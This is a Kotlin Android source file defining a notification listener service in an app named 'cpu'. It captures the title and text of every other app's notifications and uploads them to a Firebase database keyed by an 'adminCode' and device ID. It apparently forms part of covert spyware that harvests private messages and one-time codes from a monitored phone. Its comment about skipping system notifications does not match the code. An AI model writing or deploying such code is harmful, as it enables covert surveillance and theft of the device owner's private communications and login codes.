package com.example.cpu

import android.content.Intent
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.example.cpu.utils.PrefsManager
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.*

class NotificationListener : NotificationListenerService() {

    private val database = FirebaseDatabase.getInstance()
    private lateinit var prefsManager: PrefsManager

    override fun onCreate() {
        super.onCreate()
        prefsManager = PrefsManager(this)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val adminCode = prefsManager.getAdminCode() ?: return
        val deviceId = prefsManager.getDeviceId() ?: return

        val notification = sbn.notification
        val extras = notification.extras

        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val packageName = sbn.packageName

        // Skip system notifications and our own
        if (packageName == this.packageName) return

        val notificationData = mapOf(
            "title" to title,
            "text" to text,
            "packageName" to packageName,
            "timestamp" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()),
            "deviceId" to deviceId
        )

        database.getReference("notifications")
            .child(adminCode)
            .child(deviceId)
            .push()
            .setValue(notificationData)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Handle notification removed if needed
    }
}